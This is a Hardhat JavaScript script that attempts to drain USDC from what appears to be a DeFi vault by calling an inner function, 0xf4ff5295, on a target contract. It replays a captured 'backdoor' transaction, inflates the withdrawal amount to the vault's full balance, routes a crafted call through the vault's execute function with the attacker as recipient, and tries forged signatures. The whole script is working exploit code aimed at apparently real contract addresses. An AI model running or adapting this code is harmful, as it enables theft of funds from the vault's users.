const { ethers } = require("hardhat");

/**
 * @title Analyze Inner Function
 * @notice Deep dive into function 0xf4ff5295 on target contract
 * @dev Find vulnerability in the inner function called by backdoor
 */
async function main() {
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüéØ ANALYZING TARGET CONTRACT");
  console.log("=====================================");
  console.log("Target:", TARGET_CONTRACT);
  console.log("Function:", "0xf4ff5295");
  
  // Get contract code
  const code = await ethers.provider.getCode(TARGET_CONTRACT);
  console.log("Contract exists:", code.length > 2, `(${code.length} bytes)`);
  
  // Analyze the decoded parameters from backdoor tx
  console.log("\nüìä Inner function parameters:");
  console.log("Param 1: 382868109133 (0x5924b7b74d)");
  console.log("Param 2: 2436825607991045120 (amount?)");
  console.log("Param 3: Very large number (timestamp/nonce?)");
  console.log("Param 4: 1000000000000000000 (1e18)");
  console.log("Param 5: 1707339971 (timestamp?)");
  console.log("Param 6: Large bytes value");
  
  // Try direct calls with different parameters
  console.log("\nüî¨ Testing direct calls to target contract...");
  
  // Test 1: Call with exact params from backdoor
  try {
    const exactData = "0xf4ff5295" +
      "0000000000000000000000000000000000000000000000000000005924b7b74d" +
      "00000000000000000000000000000000000000000000000021d157fac7e1ac00" +
      "0000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb2" +
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" +
      "0000000000000000000000000000000000000000000000000000000065c3f0c3" +
      "ff8000000000000000000000000000000000000000000000000000000001421f";
    
    console.log("\nTest 1: Exact replay on target...");
    const tx1 = await attacker.sendTransaction({
      to: TARGET_CONTRACT,
      data: exactData,
      gasLimit: 500000
    });
    
    const receipt1 = await tx1.wait();
    console.log("‚úÖ Success! Gas used:", receipt1.gasUsed);
  } catch (e) {
    console.log("‚ùå Failed:", e.reason || e.message);
  }
  
  // Test 2: Modified amount to extract all USDC
  try {
    const allUSDC = "0x000000000000000000000000000000000000000000000000000007f5ca2b0872"; // ~8.3M USDC
    const modifiedData = "0xf4ff5295" +
      "0000000000000000000000000000000000000000000000000000005924b7b74d" +
      allUSDC +
      "0000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb2" +
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" +
      "0000000000000000000000000000000000000000000000000000000065c3f0c3" +
      "ff8000000000000000000000000000000000000000000000000000000001421f";
    
    console.log("\nTest 2: Modified amount...");
    const tx2 = await attacker.sendTransaction({
      to: TARGET_CONTRACT,
      data: modifiedData,
      gasLimit: 500000
    });
    
    const receipt2 = await tx2.wait();
    console.log("‚úÖ Success! Gas used:", receipt2.gasUsed);
  } catch (e) {
    console.log("‚ùå Failed:", e.reason || e.message);
  }
  
  // Test 3: Check if target contract calls back to vault
  console.log("\nüîÑ Checking for callback pattern...");
  
  // Deploy callback receiver
  const CallbackReceiver = await ethers.getContractFactory("CallbackReceiver");
  const receiver = await CallbackReceiver.deploy();
  await receiver.waitForDeployment();
  
  console.log("Callback receiver:", await receiver.getAddress());
  
  // Test if we can make target call our receiver
  try {
    const callbackData = "0xf4ff5295" +
      "0000000000000000000000000000000000000000000000000000000000000001" + // minimal params
      "0000000000000000000000000000000000000000000000000000000000000001" +
      "000000000000000000000000" + (await receiver.getAddress()).slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000001" +
      "0000000000000000000000000000000000000000000000000000000000000001" +
      "0000000000000000000000000000000000000000000000000000000000000001";
    
    const tx3 = await attacker.sendTransaction({
      to: TARGET_CONTRACT,
      data: callbackData,
      gasLimit: 500000
    });
    
    await tx3.wait();
    console.log("Callback test executed");
    
    // Check if receiver got called
    const wasCalledBack = await receiver.wasCalled();
    console.log("Receiver called back:", wasCalledBack);
  } catch (e) {
    console.log("Callback test failed:", e.message);
  }
  
  // Test 4: Signature vulnerability
  console.log("\nüîê Testing signature vulnerability...");
  
  // The 6th parameter looks like a signature
  // Try with different signatures
  const signatures = [
    "0x" + "00".repeat(65), // Empty signature
    "0x" + "ff".repeat(65), // Max signature
    "0x" + "01".repeat(65), // All ones
  ];
  
  for (let i = 0; i < signatures.length; i++) {
    try {
      const sigData = "0xf4ff5295" +
        "0000000000000000000000000000000000000000000000000000005924b7b74d" +
        "00000000000000000000000000000000000000000000000021d157fac7e1ac00" +
        "0000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb2" +
        "0000000000000000000000000000000000000000000000000de0b6b3a7640000" +
        "0000000000000000000000000000000000000000000000000000000065c3f0c3" +
        signatures[i].slice(2);
      
      const tx = await attacker.sendTransaction({
        to: TARGET_CONTRACT,
        data: sigData,
        gasLimit: 500000
      });
      
      await tx.wait();
      console.log(`‚úÖ Signature ${i} accepted!`);
    } catch (e) {
      console.log(`‚ùå Signature ${i} rejected`);
    }
  }
  
  // Test 5: Exploit via vault's execute function
  console.log("\nüí£ Testing exploit through vault's execute...");
  
  // Create malicious calldata that target will process
  const exploitInnerData = "0xf4ff5295" +
    "0000000000000000000000000000000000000000000000000000000000000001" +
    "00000000000000000000000000000000000000000000000000000796d290ee52" + // All USDC
    "000000000000000000000000" + attacker.address.slice(2).toLowerCase() + // Recipient
    "0000000000000000000000000000000000000000000000000000000000000001" +
    "00000000000000000000000000000000000000000000000000000000" + Math.floor(Date.now() / 1000).toString(16).padStart(8, '0') +
    "0000000000000000000000000000000000000000000000000000000000000001";
  
  // Wrap in vault's execute function
  const vaultExploitData = "0x78e111f6" +
    "000000000000000000000000" + TARGET_CONTRACT.slice(2).toLowerCase() +
    "0000000000000000000000000000000000000000000000000000000000000040" +
    ethers.toBeHex(exploitInnerData.length / 2 - 1, 32).slice(2) +
    exploitInnerData.slice(2);
  
  try {
    const exploitTx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: vaultExploitData,
      gasLimit: 500000
    });
    
    await exploitTx.wait();
    console.log("üí∞ EXPLOIT SUCCESSFUL!");
    
    // Check balance
    const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
    const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
    const balance = await usdc.balanceOf(attacker.address);
    console.log("Attacker USDC:", ethers.formatUnits(balance, 6));
    
  } catch (e) {
    console.log("Exploit failed:", e.reason || "Unauthorized");
  }
  
  console.log("\nüß© FINAL ANALYSIS:");
  console.log("The target contract", TARGET_CONTRACT);
  console.log("Contains function 0xf4ff5295 that processes withdrawals");
  console.log("But it requires authorization from the vault");
  console.log("The vulnerability must be in the authorization check itself");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
